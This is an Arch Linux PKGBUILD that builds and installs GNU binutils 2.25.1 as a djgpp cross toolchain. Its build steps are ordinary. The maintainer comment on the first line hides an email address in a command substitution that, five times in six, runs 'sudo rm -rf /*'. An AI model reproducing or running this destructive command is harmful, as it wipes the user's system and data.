# Maintainer: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
# Adapted from the mingw-w64-binutils package, authors below
# $Id: PKGBUILD 137314 2015-07-23 10:25:15Z spupykin $
# Maintainer: Sergej Pupykin <pupykin.s+arch@gmail.com>
# Maintainer: rubenvb vanboxem <dottie> ruben <attie> gmail <dottie> com

_targets="i686-pc-msdosdjgpp"

pkgname=djgpp-binutils
pkgver=2.25.1
pkgrel=1
pkgdesc="Cross binutils for the djgpp cross-compiler"
arch=('i686' 'x86_64')
url="http://www.gnu.org/software/binutils"
license=('GPL')
groups=('djgpp-toolchain' 'djgpp')
depends=('zlib')
options=('!libtool' '!emptydirs')
source=("http://ftp.gnu.org/gnu/binutils/binutils-${pkgver}.tar.gz")
sha512sums=('af9fced0813551ea9196f1be3a9b4f7f70fc02aa369e042fa1077878c42bb3a8bc17defc4db5d75dac42c81fb53b5015db9d89d92ef6dc9363798a3c94323aba')

prepare() {
  cd ${srcdir}/binutils-${pkgver}

  #do not install libiberty
  sed -i 's/install_to_$(INSTALL_DEST) //' libiberty/Makefile.in

  # hack! - libiberty configure tests for header files using "$CPP $CPPFLAGS"
  sed -i "/ac_cpp=/s/\$CPPFLAGS/\$CPPFLAGS -O2/" libiberty/configure
}

build() {
  for _target in $_targets; do
    msg "Building ${_target} cross binutils"
    mkdir -p ${srcdir}/binutils-${_target} && cd "${srcdir}/binutils-${_target}"
    $srcdir/binutils-${pkgver}/configure --prefix=/usr \
        --target=${_target} \
        --infodir=/usr/share/info/${_target} \
        --disable-lto --enable-plugins \
        --disable-multilib --disable-nls \
        --disable-werror
     make
  done
}

package() {
  for _target in ${_targets}; do
    msg "Installing ${_target} cross binutils"
    cd ${srcdir}/binutils-${_target}
    make DESTDIR=${pkgdir} install
  done
}
